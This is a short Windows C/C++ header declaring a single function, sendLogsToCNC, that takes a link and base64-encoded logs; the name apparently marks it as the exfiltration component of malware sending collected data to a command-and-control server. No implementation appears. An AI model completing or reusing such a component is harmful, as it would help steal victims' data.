#pragma once
#include <windows.h>

void sendLogsToCNC(WCHAR* GetLink, CHAR* base64Logs, SIZE_T logsSize);